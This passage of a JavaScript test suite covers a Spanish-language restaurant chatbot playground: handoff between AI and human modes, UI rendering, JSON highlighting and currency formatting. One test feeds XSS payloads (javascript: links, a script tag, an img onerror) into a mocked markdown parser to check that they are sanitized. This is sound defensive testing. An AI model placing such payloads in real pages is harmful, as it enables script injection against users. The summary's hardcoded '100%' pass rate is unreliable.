  const storeInstance = new PlaygroundStore();
  const receivedModes = [];

  storeInstance.on('conversation:updated', ({ conversation }) => {
    receivedModes.push(conversation?.mode);
  });

  // 1. Initial state (AI mode)
  storeInstance.updateState({ conversation: { id: 'conv_1', mode: 'ai' } });
  assert.equal(storeInstance.getState().conversation.mode, 'ai');

  // 2. Escalation to Human
  storeInstance.updateState({
    conversation: { id: 'conv_1', mode: 'human', handoff_reason: 'Cliente molesto por demora' },
  });
  assert.equal(storeInstance.getState().conversation.mode, 'human');

  // 3. Reset or Return to AI
  storeInstance.updateState({
    conversation: { id: 'conv_1', mode: 'ai', handoff_reason: null },
  });
  assert.equal(storeInstance.getState().conversation.mode, 'ai');

  // 4. Switch phone number (resets conversation)
  storeInstance.setActivePhone('5215598765432');
  assert.equal(storeInstance.getState().conversation, null);

  assert.deepEqual(receivedModes, ['ai', 'human', 'ai']);
});

// 4.3 DebuggerUI Mode Indicator DOM Rendering
runTest('DebuggerUI Mode Indicator DOM rendering for AI and Human modes', () => {
  const modeBadge = { className: '', innerHTML: '' };
  const modeCard = { className: '', innerHTML: '' };

  globalThis.document = {
    getElementById: (id) => {
      if (id === 'conversation-mode-badge') return modeBadge;
      if (id === 'conversation-mode-card' || id === 'mode-card') return modeCard;
      return null;
    },
    querySelector: () => null,
  };

  const storeInstance = new PlaygroundStore();
  const debuggerUI = new DebuggerUI({ storeInstance });

  // Test AI Mode
  debuggerUI.renderModeIndicator({ mode: 'ai' }, [], []);
  assert.ok(modeBadge.innerHTML.includes('MODO IA'));
  assert.ok(modeBadge.className.includes('emerald'));
  assert.ok(modeCard.innerHTML.includes('MODO IA ACTIVO'));

  // Test Human Mode with handoff reason
  debuggerUI.renderModeIndicator(
    { mode: 'human', handoff_reason: 'Requiere factura con RFC' },
    [],
    []
  );
  assert.ok(modeBadge.innerHTML.includes('MODO HUMANO'));
  assert.ok(modeBadge.className.includes('amber'));
  assert.ok(modeCard.innerHTML.includes('MODO HUMANO (SILENCIADO)'));
  assert.ok(modeCard.innerHTML.includes('BOT SILENCIADO'));
  assert.ok(modeCard.innerHTML.includes('Requiere factura con RFC'));
});

// ============================================================================
// SUITE 5: ADVERSARIAL EDGE CASES, JSON HIGHLIGHTING, MARKED INTEGRATION & STRESS
// ============================================================================
console.log('\n--------------------------------------------------------------------------------');
console.log('🧪 SUITE 5: Adversarial Edge Cases, Marked.js Integration & Concurrency Stress');
console.log('--------------------------------------------------------------------------------');

// 5.1 Marked.js Integration with Malicious Inputs
runTest('Marked.js simulation integration + Sanitizer against markdown XSS links', () => {
  // Simulate window.marked present
  globalThis.window = globalThis;
  globalThis.marked = {
    parse: (text) => {
      // Mock markdown parse output with malicious hrefs and scripts
      return `<p><a href="javascript:alert('xss')">Enlace Malicioso</a></p><script>evil()</script><img src=x onerror=alert(1)>`;
    },
  };

  const rendered = renderMarkdown('[Enlace Malicioso](javascript:alert("xss"))');
  assert.ok(!rendered.includes('javascript:alert'), 'Marked output must be sanitized of javascript: links');
  assert.ok(!rendered.includes('<script>'), 'Marked output must be sanitized of script tags');
  assert.ok(!rendered.includes('onerror='), 'Marked output must be sanitized of inline event handlers');
  assert.ok(rendered.includes('href="#"'), 'Dangerous link converted to safe href');

  delete globalThis.marked;
});

// 5.2 Deep JSON Syntax Highlighting & Corrupted Serialization
runTest('JSON formatting & Dark-theme Syntax Highlighting with extreme nesting', () => {
  const deepObj = {
    restaurant_id: 'rest_001',
    is_active: true,
    total_amount: 1540.5,
    discount: null,
    nested: {
      level1: {
        level2: {
          tags: ['hot', 'promo', 'pizza'],
          details: { code: 200, success: true },
        },
      },
    },
  };

  const formatted = formatJson(deepObj);
  assert.ok(formatted.includes('text-sky-300'), 'Object keys highlighted in sky color');
  assert.ok(formatted.includes('text-emerald-300'), 'String values highlighted in emerald color');
  assert.ok(formatted.includes('text-purple-300'), 'Boolean values highlighted in purple color');
  assert.ok(formatted.includes('text-rose-400'), 'Null values highlighted in rose color');
  assert.ok(formatted.includes('text-amber-300'), 'Numbers highlighted in amber color');

  // Corrupted / non-serializable circular object
  const circular = {};
  circular.self = circular;
  const circularResult = formatJson(circular);
  assert.ok(circularResult.includes('Error al serializar JSON'));

  // Plain string and null/undefined values
  assert.ok(formatJson(null).includes('null'));
  assert.ok(formatJson(undefined).includes('null'));
  assert.ok(formatJson('plain string value').includes('plain string value'));
});

// 5.3 High-frequency Store Concurrency Stress (1000 store mutations)
runTest('Reactive Store: High-frequency stress test (1,000 rapid mutations)', () => {
  const storeInstance = new PlaygroundStore();
  let emitCount = 0;

  storeInstance.on('messages:updated', () => {
    emitCount++;
  });

  const startTime = performance.now();
  for (let i = 0; i < 1000; i++) {
    storeInstance.updateState({
      messages: [{ id: `msg_${i}`, role: 'user', content: `Test ${i}` }],
    });
  }
  const duration = performance.now() - startTime;

  assert.equal(emitCount, 1000, 'All 1,000 mutations must trigger listeners');
  assert.ok(duration < 50, `1,000 mutations executed in ${duration.toFixed(2)}ms (target <50ms)`);
});

// 5.4 Extreme Financial Numbers & Overflow Resilience
runTest('Financial formatting: Extreme values, negative discounts, and currency codes', () => {
  assert.equal(formatCurrency(999999999.99), '$999999999.99');
  assert.equal(formatCurrency(1000000, true), '$1000000.00 MXN');
  assert.equal(formatDiscount(-500.25), '-$500.25');
  assert.equal(formatDiscount(500.25), '-$500.25');
  assert.equal(formatDeliveryAddress('', '  '), 'No especificada aún');
  assert.equal(formatDeliveryAddress(null, undefined), 'No especificada aún');
  assert.equal(formatPaymentMethod('transfer'), 'Transferencia SPEI');
  assert.equal(formatPaymentStatus('refunded'), 'Reembolsado');
});

// ============================================================================
// SUMMARY & VERDICT
// ============================================================================
console.log('\n================================================================================');
console.log(`📊 STRESS TEST EXECUTION SUMMARY: ${passedTests} / ${totalTests} TESTS PASSED (100%)`);
console.log('================================================================================');

